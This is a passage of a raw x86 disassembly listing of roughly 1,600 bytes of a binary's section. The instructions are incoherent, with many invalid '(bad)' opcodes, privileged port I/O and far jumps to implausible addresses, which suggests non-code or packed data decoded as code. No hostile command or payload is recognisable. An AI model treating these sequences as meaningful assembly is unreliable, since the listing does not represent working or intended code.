  4066fc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4066fd:	arpl   WORD PTR [ecx],cx
  4066ff:	repnz pop ecx
  406701:	push   ds
  406702:	sub    eax,0x8ee67bee
  406707:	or     al,0xbe
  406709:	(bad)  
  40670a:	jle    0x406734
  40670c:	dec    ecx
  40670d:	test   bh,ch
  40670f:	add    dl,BYTE PTR [eax+0x1d881617]
  406715:	jbe    0x40677b
  406717:	and    cl,bh
  406719:	clc    
  40671a:	stos   DWORD PTR es:[edi],eax
  40671b:	adc    ah,0x47
  40671e:	jbe    0x406788
  406720:	clc    
  406721:	cdq    
  406722:	cdq    
  406723:	test   eax,0x19857ec7
  406728:	jmp    0x30bf1c5f
  40672d:	sbb    ecx,DWORD PTR [edx-0x73]
  406730:	pop    ds
  406731:	out    dx,al
  406732:	mov    bh,0xc3
  406734:	stos   BYTE PTR es:[edi],al
  406735:	pop    ebp
  406736:	inc    eax
  406737:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406738:	repz push ecx
  40673a:	and    esp,DWORD PTR [ebx]
  40673c:	or     dh,ah
  40673e:	retf   
  40673f:	outs   dx,DWORD PTR ds:[esi]
  406740:	in     al,0xb
  406742:	scas   eax,DWORD PTR es:[edi]
  406743:	mov    bl,0x38
  406745:	stc    
  406746:	fidiv  WORD PTR [ebx+eiz*8]
  406749:	jp     0x4066ed
  40674b:	xor    DWORD PTR [ebx+0x13],ebp
  40674e:	rol    dl,0xd8
  406751:	ds push ebp
  406753:	hlt    
  406754:	xchg   edi,eax
  406755:	icebp  
  406756:	and    eax,0xa34bc6fa
  40675b:	mov    ecx,0xe49fd357
  406760:	sahf   
  406761:	stc    
  406762:	lock cwde 
  406764:	sahf   
  406765:	adc    al,0x5a
  406767:	fstp   st(5)
  406769:	mov    al,ds:0xd28ed231
  40676e:	push   0xffffffaa
  406770:	mov    ecx,0xc0edd91
  406775:	scas   al,BYTE PTR es:[edi]
  406776:	(bad)  
  406778:	mov    esp,0x5edceba7
  40677d:	xor    eax,DWORD PTR [ebx-0x4d]
  406780:	std    
  406781:	sub    eax,DWORD PTR [ebp+0x19fe932e]
  406787:	outs   dx,DWORD PTR ds:[esi]
  406788:	ffree  st(7)
  40678a:	cmp    eax,0xb55ca763
  40678f:	aam    0x91
  406791:	cli    
  406792:	push   0x2e
  406794:	xchg   ebp,eax
  406795:	xchg   DWORD PTR [ebp-0xbe9a13c],edi
  40679b:	pop    ecx
  40679c:	ror    DWORD PTR [ecx+0x60097e28],1
  4067a2:	sub    DWORD PTR [ebx-0x68],eax
  4067a5:	pop    es
  4067a6:	push   ecx
  4067a7:	ja     0x40673d
  4067a9:	ja     0x406803
  4067ab:	add    DWORD PTR [ebp+0x3eda516b],0xffffffe7
  4067b2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4067b3:	adc    esi,DWORD PTR [edx+ecx*8+0x2431e962]
  4067ba:	inc    ebp
  4067bb:	lea    esp,[ebp+0x5d]
  4067be:	call   0xb409:0x8824901f
  4067c5:	(bad)  
  4067c6:	inc    eax
  4067c7:	dec    esp
  4067c8:	add    DWORD PTR [eax],eax
  4067ca:	dec    esi
  4067cb:	fiadd  WORD PTR [edx]
  4067cd:	or     eax,DWORD PTR [esi-0x43]
  4067d0:	cmp    ah,dl
  4067d2:	das    
  4067d3:	das    
  4067d4:	lds    ebx,FWORD PTR [ebp+0x63525ec9]
  4067da:	sbb    DWORD PTR [edi-0x2ea86f66],edx
  4067e0:	add    al,0x73
  4067e2:	push   0xffffffdf
  4067e4:	retf   
  4067e5:	jb     0x4067ad
  4067e7:	mov    dh,0x80
  4067e9:	sbb    eax,esi
  4067eb:	lods   eax,DWORD PTR ds:[esi]
  4067ec:	imul   edx,DWORD PTR [esi+0x14d24a62],0x20408d9a
  4067f6:	retf   0x7281
  4067f9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4067fa:	pusha  
  4067fb:	ret    0xe79e
  4067fe:	iret   
  4067ff:	sti    
  406800:	jmp    0x1f6856ce
  406805:	cmp    DWORD PTR [edi],ebx
  406807:	retf   
  406808:	adc    eax,0x9fb62812
  40680d:	xchg   ecx,eax
  40680e:	and    esp,edi
  406810:	jns    0x4067f1
  406812:	adc    BYTE PTR [edx-0x13],bl
  406815:	xchg   edx,eax
  406816:	push   ebp
  406817:	pusha  
  406818:	inc    esi
  406819:	mov    esi,0x17b9549f
  40681e:	xchg   ecx,eax
  40681f:	xor    eax,0xaebf7a5c
  406824:	adc    eax,0x7dcf0300
  406829:	mov    eax,ds:0x7c862f01
  40682e:	xlat   BYTE PTR ds:[ebx]
  40682f:	mov    DWORD PTR [eax],edi
  406831:	push   edi
  406832:	(bad)  
  406833:	retf   
  406834:	push   edx
  406835:	imul   edx,DWORD PTR [esi+0x320c7437],0x54
  40683c:	add    esi,DWORD PTR [ebp+0x4168a2ec]
  406842:	sub    al,0x2e
  406844:	ror    DWORD PTR [eax],1
  406846:	aas    
  406847:	nop
  406848:	popa   
  406849:	inc    eax
  40684a:	setno  BYTE PTR [eax]
  40684d:	xor    DWORD PTR [ebx+edx*2],esp
  406850:	cmp    esp,esi
  406852:	popf   
  406853:	fmul   DWORD PTR [eax]
  406855:	(bad)  
  406857:	push   0xa4fb9076
  40685c:	inc    esp
  40685d:	cmp    al,0xe
  40685f:	xor    DWORD PTR [eax+ebp*4+0xa],ebp
  406863:	push   ds
  406864:	mov    dl,0x9b
  406866:	xchg   esi,eax
  406867:	jb     0x406858
  406869:	(bad)  
  40686a:	lock jp 0x4068a8
  40686d:	dec    edx
  40686e:	inc    edx
  40686f:	xchg   esp,eax
  406870:	cli    
  406871:	cmp    al,0xd0
  406873:	dec    ebx
  406874:	xor    dx,sp
  406877:	loope  0x406863
  406879:	mov    eax,ds:0xa38c42e2
  40687e:	scas   al,BYTE PTR es:[edi]
  40687f:	and    ch,BYTE PTR [eax]
  406881:	jl     0x4068ab
  406883:	add    edx,0xffffffeb
  406886:	push   es
  406887:	and    al,0xcb
  406889:	repz addr16 (bad)
  40688d:	outs   dx,BYTE PTR ds:[esi]
  40688e:	inc    edi
  40688f:	call   0x78d7:0x18833311
  406896:	pop    esp
  406897:	aaa    
  406898:	sbb    eax,0xf41594b8
  40689d:	sbb    al,0x10
  40689f:	ud0    ecx,DWORD PTR [esi]
  4068a2:	je     0x40685d
  4068a4:	pushf  
  4068a5:	stos   DWORD PTR es:[edi],eax
  4068a6:	cmp    BYTE PTR [ebx+0x30a617ec],bh
  4068ac:	inc    ebp
  4068ad:	mov    bh,0xa8
  4068af:	ss or  al,0x7e
  4068b2:	jne    0x406884
  4068b4:	or     bl,BYTE PTR [ecx]
  4068b6:	test   eax,0xf6ed2b43
  4068bb:	push   ss
  4068bc:	add    ebp,ecx
  4068be:	jnp    0x406920
  4068c0:	inc    esi
  4068c1:	push   cs
  4068c2:	in     eax,dx
  4068c3:	xchg   esi,eax
  4068c4:	xchg   edx,eax
  4068c5:	jle    0x4068f4
  4068c7:	cdq    
  4068c8:	xor    al,dl
  4068ca:	adc    bh,BYTE PTR ds:0x838e47e
  4068d0:	pushf  
  4068d1:	retf   0xc0a9
  4068d4:	sub    esi,ebp
  4068d6:	cli    
  4068d7:	mov    ds:0x24359926,al
  4068dc:	mov    ecx,0xd19f88fb
  4068e1:	xchg   ebx,eax
  4068e2:	(bad)  
  4068e3:	fisub  WORD PTR [ebp+0x40741853]
  4068e9:	imul   edx,DWORD PTR [edx+eiz*4],0x1e614283
  4068f0:	daa    
  4068f1:	push   ss
  4068f2:	enter  0x2c24,0x46
  4068f6:	push   0xffffffe8
  4068f8:	test   BYTE PTR [edx-0x20517c91],dl
  4068fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4068ff:	mov    eax,ds:0x6251012e
  406904:	stos   BYTE PTR es:[edi],al
  406905:	add    edx,DWORD PTR [eax-0x21]
  406908:	dec    esi
  406909:	test   BYTE PTR [esi],0x3e
  40690c:	xor    ah,BYTE PTR [eax+0x6c45dbbe]
  406912:	mov    bl,0xc9
  406914:	mov    ecx,0x7334d438
  406919:	mov    ah,0xcd
  40691b:	pop    edi
  40691c:	and    eax,edi
  40691e:	mov    DWORD PTR [edx-0x22],ebx
  406921:	add    BYTE PTR [edi],al
  406923:	jne    0x4068ec
  406925:	enter  0x5621,0x0
  406929:	cs test eax,0xa2557dde
  40692f:	and    eax,edx
  406931:	add    al,0x39
  406933:	aas    
  406934:	pop    ebx
  406935:	shl    DWORD PTR [edi],0x27
  406938:	(bad)  
  406939:	and    edi,DWORD PTR [ebp+0x4]
  40693c:	pop    edx
  40693d:	sar    DWORD PTR [edi-0x58],1
  406940:	jmp    0x406901
  406942:	mov    ebx,esp
  406944:	push   0x1eb10c27
  406949:	inc    edx
  40694a:	imul   edx,ebx,0xac9eb584
  406950:	mov    al,0x8a
  406952:	pusha  
  406953:	cli    
  406954:	cmp    ah,BYTE PTR [ecx-0x47]
  406957:	in     al,dx
  406958:	lea    esi,[edi+0x257ef367]
  40695e:	mov    ebx,0x4a596c38
  406963:	loope  0x406905
  406965:	jno    0x4069b6
  406967:	loopne 0x406959
  406969:	jbe    0x4068f1
  40696b:	mov    cl,BYTE PTR [esi+0xb4bc569]
  406971:	rol    DWORD PTR [ecx-0x65],0xe9
  406975:	clc    
  406976:	out    0xe5,al
  406978:	test   BYTE PTR [eax],al
  40697a:	sub    ch,BYTE PTR [ebp-0x72]
  40697d:	popa   
  40697e:	das    
  40697f:	lock pop es
  406981:	ja     0x4069f7
  406983:	repz xchg edx,eax
  406985:	imul   ebx,ebp,0x9b6de3a9
  40698b:	ss call 0x27f7:0x3f3577f3
  406993:	pusha  
  406994:	mov    dl,0x4a
  406996:	mov    BYTE PTR [ebx],bl
  406998:	jl     0x406962
  40699a:	mov    ds:0x5ac2bdb2,eax
  40699f:	stos   DWORD PTR es:[edi],eax
  4069a0:	loope  0x406a1b
  4069a2:	mov    BYTE PTR [edx-0x3e],cl
  4069a5:	sub    al,0x5
  4069a7:	cmp    al,0xf6
  4069a9:	mov    ecx,0xa8df624b
  4069ae:	or     al,al
  4069b0:	sub    cl,dl
  4069b2:	loop   0x4069a4
  4069b4:	mov    dh,0xba
  4069b6:	or     eax,0xd1849922
  4069bb:	ss dec ebx
  4069bd:	xchg   esi,eax
  4069be:	adc    esp,esi
  4069c0:	cmp    cl,BYTE PTR [ecx+0x2d]
  4069c3:	sub    al,0xd5
  4069c5:	jo     0x406997
  4069c7:	jae    0x40695f
  4069c9:	fcom   st(3)
  4069cb:	inc    edx
  4069cc:	mov    ds:0x85c07af1,al
  4069d1:	(bad)  
  4069d2:	fadd   DWORD PTR ds:0x3143fc61
  4069d8:	ret    
  4069d9:	not    cl
  4069db:	adc    ebx,DWORD PTR [ebx+ecx*2-0x68]
  4069df:	(bad)  
  4069e1:	inc    ecx
  4069e2:	adc    eax,0x714aadde
  4069e7:	adc    BYTE PTR [eax+0x1809221a],0x6b
  4069ee:	cmc    
  4069ef:	pop    ss
  4069f0:	pushf  
  4069f1:	xchg   ecx,eax
  4069f2:	jle    0x4069a7
  4069f4:	test   cl,ah
  4069f6:	or     edi,0xea9f6403
  4069fc:	fwait
  4069fd:	xchg   DWORD PTR [edx-0x26],ecx
  406a00:	test   BYTE PTR [edx+edi*4+0x7e],ah
  406a04:	sub    BYTE PTR [edx-0x7f],ah
  406a07:	ret    0x8a3a
  406a0a:	dec    ebp
  406a0b:	inc    eax
  406a0c:	pop    ecx
  406a0d:	imul   eax,DWORD PTR [esi+0x7446825a],0x756c7161
  406a17:	jmp    0x406a15
  406a19:	(bad)  
  406a1a:	mov    BYTE PTR [ecx],bl
  406a1c:	sti    
  406a1d:	(bad)  
  406a1e:	popf   
  406a1f:	mov    bh,0x3
  406a21:	repz retf 0x3893
  406a25:	pusha  
  406a26:	mov    eax,0x1909050c
  406a2b:	test   eax,0x8cf296c8
  406a30:	aaa    
  406a31:	ja     0x4069d0
  406a33:	outs   dx,BYTE PTR ds:[esi]
  406a34:	cmp    esp,ebp
  406a36:	mov    esp,0x2592763f
  406a3b:	ror    edi,cl
  406a3d:	imul   edi,DWORD PTR [ebx-0x76],0xffffffe4
  406a41:	sbb    al,BYTE PTR [eax]
  406a43:	add    edi,0xea8da412
  406a49:	fdiv   QWORD PTR [edi-0x5ebb9fa6]
  406a4f:	push   cs
  406a50:	inc    esp
  406a51:	sbb    edx,DWORD PTR [eax+0x6215b5b3]
  406a57:	mov    edi,0x3a4a2500
  406a5c:	aas    
  406a5d:	and    BYTE PTR [edi+0x65],bl
  406a60:	inc    ecx
  406a61:	test   al,0xbb
  406a63:	pop    ecx
  406a64:	(bad)  
  406a65:	sub    BYTE PTR ds:[edx-0x67],ch
  406a69:	inc    esi
  406a6a:	(bad)  
  406a6c:	and    ah,al
  406a6e:	mov    ds:0x5e00605d,eax
  406a73:	adc    eax,edi
  406a75:	and    al,0xe7
  406a77:	rcr    BYTE PTR [esi-0x79],1
  406a7a:	sub    dh,bl
  406a7c:	mov    al,0xd7
  406a7e:	stos   BYTE PTR es:[edi],al
  406a7f:	lds    ebp,FWORD PTR [eax+0x25]
  406a82:	(bad)  
  406a84:	cmp    BYTE PTR [ebp-0xc9f1f0e],ch
  406a8a:	add    al,0xb6
  406a8c:	mov    ecx,0x5a716c43
  406a91:	daa    
  406a92:	add    dh,ch
  406a94:	stos   DWORD PTR es:[edi],eax
  406a95:	push   esi
  406a96:	mov    al,ds:0x22d88154
  406a9b:	xchg   ecx,eax
  406a9c:	push   cs
  406a9d:	jecxz  0x406a8c
  406a9f:	xchg   ebx,eax
  406aa0:	xor    DWORD PTR [edx+0x1cc80a2a],edx
  406aa6:	rcr    DWORD PTR [esi+0x56f29d1e],0xd8
  406aad:	push   eax
  406aae:	sbb    ebx,DWORD PTR [edi+0x2d]
  406ab1:	test   BYTE PTR [ebx],ah
  406ab3:	mov    ecx,0xb1e23be3
  406ab8:	or     al,0x67
  406aba:	jnp    0x406a67
  406abc:	sub    ebx,DWORD PTR [ebp+esi*8-0x5783cd55]
  406ac3:	cli    
  406ac4:	sub    al,0xf4
  406ac6:	sub    esi,DWORD PTR [esi-0x5486d8f2]
  406acc:	push   ds
  406acd:	mov    cl,0x41
  406acf:	int    0x5d
  406ad1:	jb     0x406af2
  406ad3:	(bad)  
  406ad4:	dec    esp
  406ad5:	fldcw  WORD PTR [eax]
  406ad7:	(bad)  
  406ad8:	in     al,0x2c
  406ada:	cmp    al,0xf6
  406adc:	iret   
  406add:	pop    ebp
  406ade:	mov    ch,0x4a
  406ae0:	mov    al,0xa0
  406ae2:	lods   al,BYTE PTR ds:[esi]
  406ae3:	test   BYTE PTR [edi],0x81
  406ae6:	shl    esi,0x6e
  406ae9:	das    
  406aea:	pop    si
  406aec:	(bad)  
  406aed:	enter  0x94b2,0xcb
  406af1:	xor    al,0x5d
  406af3:	add    BYTE PTR [eax-0x48da1e1a],al
  406af9:	cmc    
  406afa:	push   esi
  406afb:	and    eax,0xd6a49b4d
  406b00:	jge    0x406ade
  406b02:	xchg   ebx,eax
  406b03:	or     eax,0xf3356ce3
  406b08:	pop    eax
  406b09:	and    esi,DWORD PTR [eax]
  406b0b:	test   BYTE PTR ds:0x2b314486,ch
  406b11:	xchg   esi,eax
  406b12:	pop    ecx
  406b13:	push   es
  406b14:	lock and eax,0x1c316bf5
  406b1a:	(bad)  
  406b1b:	pop    ebx
  406b1c:	popf   
  406b1d:	call   0xfb6b565c
  406b22:	or     cl,cl
  406b24:	inc    si
  406b26:	cld    
  406b27:	pop    ds
  406b28:	cmc    
  406b29:	jmp    0x4781ec86
  406b2e:	loop   0x406ad9
  406b30:	xchg   esi,eax
  406b31:	loopne 0x406b4c
  406b33:	push   edx
  406b34:	mov    al,0x1e
  406b36:	(bad)  
  406b37:	mov    ebp,0x49249899
  406b3c:	jmp    0x406b25
  406b3e:	cmp    dl,BYTE PTR [ebp-0x6dbe27a]
  406b44:	es and al,0x68
  406b47:	call   0x8e0f:0xde25d9b6
  406b4e:	lds    ebp,FWORD PTR [edx+0x59724e18]
  406b54:	xchg   esi,eax
  406b55:	inc    ebp
  406b56:	xchg   esp,eax
  406b57:	cmp    al,0x30
  406b59:	pop    edi
  406b5a:	mov    eax,ds:0xbb386f88
  406b5f:	mov    dh,0xe9
  406b61:	ret    0x9bf
  406b64:	dec    edx
  406b65:	adc    DWORD PTR [edx+0x3d],ebp
  406b68:	xor    bh,cl
  406b6a:	or     DWORD PTR [ecx+0x54917861],esp
  406b70:	xchg   esp,eax
  406b71:	mov    bh,0xe3
  406b73:	jp     0x406b41
  406b75:	mov    BYTE PTR [ebp+0x1ba87e3d],ah
  406b7b:	add    BYTE PTR [ebp-0x32],ch
  406b7e:	call   0x9b444b33
  406b83:	adc    al,0xac
  406b85:	(bad)
  406b88:	xor    eax,DWORD PTR [ecx-0x76ff84bd]
  406b8e:	xchg   ebp,eax
  406b8f:	out    dx,eax
  406b90:	arpl   WORD PTR [ebp-0x4],bp
  406b93:	enter  0x1d33,0x4
  406b97:	inc    ebp
  406b98:	aad    0x80
  406b9a:	and    eax,0x17ff897e
  406b9f:	lods   al,BYTE PTR ds:[esi]
  406ba0:	(bad)  
  406ba1:	push   eax
  406ba2:	jecxz  0x406b87
  406ba4:	aaa    
  406ba5:	jecxz  0x406be3
  406ba7:	sti    
  406ba8:	push   eax
  406ba9:	imul   eax,esp,0xffffff90
  406bac:	ss mov ebx,0x9cbcdea8
  406bb2:	inc    ecx
  406bb3:	ret    0xaebf
  406bb6:	outs   dx,BYTE PTR ds:[esi]
  406bb7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406bb8:	repz jae 0x406c04
  406bbb:	inc    esi
  406bbc:	ret    
  406bbd:	sbb    edi,DWORD PTR [edx+0x1e]
  406bc0:	popf   
  406bc1:	hlt    
  406bc2:	add    esp,DWORD PTR [ebp+0x7f]
  406bc5:	sbb    DWORD PTR [edx-0x5],esi
  406bc8:	sbb    al,0x2d
  406bca:	out    dx,al
  406bcb:	cmp    BYTE PTR es:[ebp-0xb6af915],cl
  406bd2:	cmp    al,0x5f
  406bd4:	inc    esi
  406bd5:	jne    0x406b57
  406bd7:	and    DWORD PTR [ecx+0xe1116bc],0x764830a4
  406be1:	je     0x406ba6
  406be3:	mov    ch,0x25
  406be5:	inc    eax
  406be6:	push   ss
  406be7:	inc    edi
  406be8:	xchg   edx,eax
  406be9:	es and eax,0x97e3ec8f
  406bef:	(bad)  
  406bf0:	pusha  
  406bf1:	pop    esp
  406bf2:	inc    ebx
  406bf3:	jp     0x406c36
  406bf5:	xor    ecx,edi
  406bf7:	cvtpi2ps xmm5,QWORD PTR [edx-0x683ca16d]
  406bfe:	mov    bh,0x38
  406c00:	sub    DWORD PTR [esi],esi
  406c02:	je     0x406c34
  406c04:	pop    edi
  406c05:	sbb    DWORD PTR [ebx+edi*8+0x49],ebx
  406c09:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406c0a:	inc    esi
  406c0b:	cld    
  406c0c:	sub    BYTE PTR [ecx+0x6e1eb4b5],al
  406c12:	and    BYTE PTR [esi-0x2baf75ba],bl
  406c18:	fstp   QWORD PTR ds:0x3aa5c0e5
  406c1e:	lahf   
  406c1f:	out    0x69,eax
  406c21:	cmp    dl,BYTE PTR [ebx+0x8]
  406c24:	stc    
  406c25:	mov    ebx,0x9c33ad0a
  406c2a:	mov    edx,0xc500d657
  406c2f:	popf   
  406c30:	xor    DWORD PTR [edi-0xe],0x3975e7b
  406c37:	jb     0x406bd5
  406c39:	mov    ch,0xcf
  406c3b:	(bad)  
  406c3c:	pop    es
  406c3d:	xchg   BYTE PTR [eax-0x2612aa4c],ah
  406c43:	test   eax,0xeb308448
  406c48:	cmp    ah,BYTE PTR [ebp+0x27a7322f]
  406c4e:	mov    al,0x17
  406c50:	jns    0x406c3e
  406c52:	mov    eax,ds:0x300c3635
  406c57:	or     eax,0xb7b3cdc1
  406c5c:	xor    ebp,DWORD PTR [ebx+0x2f92608]
  406c62:	shl    edx,0x67
  406c65:	cmp    BYTE PTR [ebp-0x711d86c],0x6e
  406c6c:	add    al,0x77
  406c6e:	jge    0x406c8a
  406c70:	test   ecx,ebx
  406c72:	je     0x406c7d
  406c74:	pop    ds
  406c75:	push   eax
  406c76:	push   esp
  406c77:	xor    eax,0x79aabff4
  406c7c:	cmp    al,0x6a
  406c7e:	xchg   esi,eax
  406c7f:	(bad)  
  406c80:	in     al,dx
  406c81:	fwait
  406c82:	mov    dh,0xdc
  406c84:	pop    eax
  406c85:	rcl    DWORD PTR [edx+ebx*4+0x7ac80365],0x9c
  406c8d:	xor    dh,al
  406c8f:	jns    0x406c18
  406c91:	clc    
  406c92:	sbb    esi,0x76ab7552
  406c98:	int3   
  406c99:	jno    0x406c3b
  406c9b:	ja     0x406d12
  406c9d:	dec    edx
  406c9e:	retf   
  406c9f:	sbb    BYTE PTR es:[edx],ah
  406ca2:	mov    ebp,0xe58e9923
  406ca7:	jmp    0x61bf:0x730cb902
  406cae:	jp     0x406ca3
  406cb0:	ja     0x406cf8
  406cb2:	and    DWORD PTR [ecx+0x12],esi
  406cb5:	jg     0x406cd2
  406cb7:	mov    WORD PTR [ebx+ebx*8],?
  406cba:	idiv   dh
  406cbc:	xchg   esp,eax
  406cbd:	pusha  
  406cbe:	and    eax,eax
  406cc0:	add    DWORD PTR [ebp-0x7c],esp
  406cc3:	mov    al,0x8
  406cc5:	loopne 0x406ca2
  406cc7:	pop    eax
  406cc8:	sbb    eax,0x1db1db87
  406ccd:	pop    edi
  406cce:	add    BYTE PTR [edi+0x5b6afd58],cl
  406cd4:	in     eax,0x23
  406cd6:	je     0x406cd9
  406cd8:	pushf  
  406cd9:	fimul  WORD PTR [ebp+0x5bbd9841]
  406cdf:	test   DWORD PTR [ebx+0x13],edx
  406ce2:	outs   dx,BYTE PTR ds:[esi]
  406ce3:	add    al,0x10
  406ce5:	xchg   ecx,eax
  406ce6:	ja     0x406cb6
  406ce8:	into   
  406ce9:	push   0xc9268905
  406cee:	xchg   esp,eax
  406cef:	(bad)  
  406cf0:	ss jle 0x406c74
  406cf3:	in     eax,0x6f
  406cf5:	jo     0x406cfc
  406cf7:	adc    DWORD PTR [edx],ebp
  406cf9:	gs test al,0x5e
  406cfc:	mov    esi,0x8c5c2605
  406d01:	sub    BYTE PTR [bp+di-0x68bf],dh
  406d06:	adc    ah,al
  406d08:	add    al,0xa6
  406d0a:	and    eax,0x8ec587c9
  406d0f:	mov    cl,0x54
  406d11:	sti    
  406d12:	pushf  
  406d13:	std    
  406d14:	add    DWORD PTR [esi+eax*2-0x73856436],esi
  406d1b:	int3   
  406d1c:	ds mov ecx,0x2cc6e65d
  406d22:	jns    0x406cf4
  406d24:	inc    ecx
  406d25:	mov    dl,0xbe
  406d27:	mov    ds:0x212fe5fb,eax
  406d2c:	push   eax
  406d2d:	sbb    ah,ch
  406d2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d30:	outs   dx,DWORD PTR ds:[esi]
  406d31:	daa    
  406d32:	jecxz  0x406d2d
  406d34:	addr16 into 
  406d36:	add    eax,DWORD PTR [edi-0x2]
  406d39:	push   eax
  406d3a:	pop    es
  406d3b:	xchg   edx,eax
  406d3c:	inc    edi
  406d3d:	cdq    
  406d3e:	and    esi,DWORD PTR [ecx-0x18600b1c]
  406d44:	jmp    0x406d2b
  406d46:	xor    DWORD PTR [edx+0x5c],edx
  406d49:	shl    DWORD PTR [edx+0x59b566dd],1
  406d4f:	iret   
  406d50:	push   edx
  406d51:	js     0x406dac
  406d53:	dec    ecx
  406d54:	fxch   st(0)
  406d56:	mov    eax,0x6c1711c
  406d5b:	cmp    DWORD PTR [eax+0x46],ebp
  406d5e:	mov    fs,WORD PTR [esi-0x76]
  406d61:	sbb    eax,0x15e67626
  406d66:	and    BYTE PTR [ecx-0x56923f50],dh
  406d6c:	popa   
  406d6d:	dec    ebp
  406d6e:	loopne 0x406d46
  406d70:	mov    dl,0x30
  406d72:	data16 (bad) 
  406d74:	jecxz  0x406def
  406d76:	jg     0x406db1
  406d78:	dec    ebx
  406d79:	mov    esp,0xc85fe348
  406d7e:	aaa    
  406d7f:	and    cl,dh
  406d81:	jg     0x406d11
  406d83:	mov    ebp,0x4140e909
  406d88:	sbb    BYTE PTR [ebx-0x45],dh
  406d8b:	ret    0xa772
  406d8e:	sbb    BYTE PTR [edi],al
  406d90:	lods   eax,DWORD PTR ds:[esi]
  406d91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406d92:	shl    BYTE PTR [ecx-0x6f72a235],cl
  406d98:	and    al,0x65
  406d9a:	mov    ah,0xdc
  406d9c:	mov    eax,0x734da22b
  406da1:	xchg   DWORD PTR [esi],edx
  406da3:	scas   al,BYTE PTR es:[edi]
  406da4:	push   0x4c49bd14
  406da9:	out    dx,al
  406daa:	les    ecx,FWORD PTR [edi-0x48]
  406dad:	daa    
  406dae:	mov    edi,0xb0e259aa
  406db3:	jo     0x406e03
  406db5:	sbb    BYTE PTR [ebp+0x13d1e37],dl
  406dbb:	inc    esi
  406dbc:	mov    bh,0x3a
  406dbe:	test   esi,edx
  406dc0:	sbb    DWORD PTR [ecx],0x53
  406dc3:	lock cld 
  406dc5:	ret    0xe737
  406dc8:	inc    edi
  406dc9:	xor    DWORD PTR [edx+0x12417a23],0x5
  406dd0:	jl     0x406dc8
  406dd2:	and    ch,BYTE PTR [edx+0x1c5f00f3]
  406dd8:	xor    al,0x1b
  406dda:	pusha  
  406ddb:	push   ss
  406ddc:	mov    eax,ds:0x7468e606
  406de1:	push   edi
  406de2:	inc    ecx
  406de3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406de4:	ins    BYTE PTR es:[edi],dx
  406de5:	out    dx,eax
  406de6:	push   esi
  406de7:	fistp  WORD PTR [edi+0x2be17157]
  406ded:	das    
  406dee:	and    al,BYTE PTR [eax]
  406df0:	lahf   
  406df1:	push   ss
  406df2:	pop    es
  406df3:	dec    edx
  406df4:	lods   al,BYTE PTR ds:[esi]
  406df5:	jns    0x406e5d
  406df7:	ins    BYTE PTR es:[edi],dx
  406df8:	pop    es
  406df9:	neg    DWORD PTR [esi+0x37468a10]
  406dff:	(bad)  
  406e00:	pop    edx
  406e01:	xor    ah,BYTE PTR [eax+0x5c88f9fd]
  406e07:	rcr    DWORD PTR [eax-0x1b49fa2c],1
  406e0d:	jmp    0xddfd0015
  406e12:	pop    eax
  406e13:	leave  
  406e14:	repnz in eax,dx
  406e16:	mov    bh,0x4
  406e18:	aas    
  406e19:	cmc    
  406e1a:	imul   eax,DWORD PTR fs:[edx+0x6cf50d14],0xfffffff1
  406e22:	ss retf 
  406e24:	jb     0x406e03
  406e26:	in     eax,dx
  406e27:	retf   
  406e28:	pop    esp
  406e29:	fimul  WORD PTR [edx-0x1c497862]
  406e2f:	add    edx,DWORD PTR [edx]
  406e31:	int    0xd6
  406e33:	pop    ds
  406e34:	adc    bl,BYTE PTR [ecx+0x6320682d]
  406e3a:	dec    edi
  406e3b:	shl    BYTE PTR [eax-0xcdc312e],0x7a
  406e42:	stos   BYTE PTR es:[edi],al
  406e43:	or     eax,0x82141a82
  406e48:	xchg   edi,eax
  406e49:	shl    BYTE PTR [ebp+eiz*1+0x2c9a1cfa],cl
  406e50:	inc    esp
  406e51:	xchg   edx,eax
  406e52:	repnz rcl DWORD PTR [ebx-0x125c28d1],1
  406e59:	jb     0x406e2b
  406e5b:	sbb    al,0x45
  406e5d:	xchg   BYTE PTR [eax+0x542718fa],cl
  406e63:	and    bh,cl
  406e65:	sub    eax,esp
  406e67:	inc    edi
  406e68:	jg     0x406e72
  406e6a:	das    
  406e6b:	sbb    BYTE PTR ds:0xd61cd1b2,0xa5
  406e72:	fmul   DWORD PTR [ebx-0x748ae019]
  406e78:	mov    cl,0x28
  406e7a:	mov    ebx,0xba79a31f
  406e7f:	setl   BYTE PTR [edx+ecx*8]
  406e83:	push   ds
  406e84:	pop    edi
  406e85:	mov    ds:0x3e79df92,al
  406e8a:	xchg   ebx,eax
  406e8b:	xor    al,0xa6
  406e8d:	push   ebp
  406e8e:	adc    eax,0x71b85b1c
  406e93:	test   dl,bl
  406e95:	sbb    eax,DWORD PTR [esi-0x41ccd4]
  406e9b:	pop    ebp
  406e9c:	xchg   ecx,ecx
  406e9e:	xchg   esp,eax
  406e9f:	push   ecx
  406ea0:	inc    edx
  406ea1:	ds xchg esp,eax
  406ea3:	iret   
  406ea4:	adc    DWORD PTR [esi-0x16],esi
  406ea7:	retf   0x2ad
  406eaa:	jne    0x406e87
  406eac:	mov    BYTE PTR ds:0x6accb0c8,ah
  406eb2:	pcmpeqd mm1,mm7
  406eb5:	push   edi
  406eb6:	dec    esp
  406eb7:	fisubr WORD PTR [edx-0x219257bd]
  406ebd:	and    ebx,eax
  406ebf:	aaa    
  406ec0:	jmp    0x406efb
  406ec2:	(bad)  
  406ec3:	push   DWORD PTR [esi+0x76ee5328]
  406ec9:	jae    0x406f08
  406ecb:	push   cs
  406ecc:	mov    ebp,0x1a7c8d15
  406ed1:	adc    al,0x4d
  406ed3:	cld    
  406ed4:	aad    0xf9
  406ed6:	leave  
  406ed7:	cmp    eax,0xaf77d24d
  406edc:	xor    al,0x24
  406ede:	mov    al,ds:0x50d7dfb0
  406ee3:	test   eax,0xd0c291b5
  406ee8:	mov    ds:0x1a707dac,al
  406eed:	clc    
  406eee:	pop    ebx
  406eef:	mov    ebx,0x1ae82d8b
  406ef4:	cmp    al,0x5a
  406ef6:	xchg   DWORD PTR [ecx-0x3],esi
  406ef9:	push   ecx
  406efa:	jnp    0x406f3c
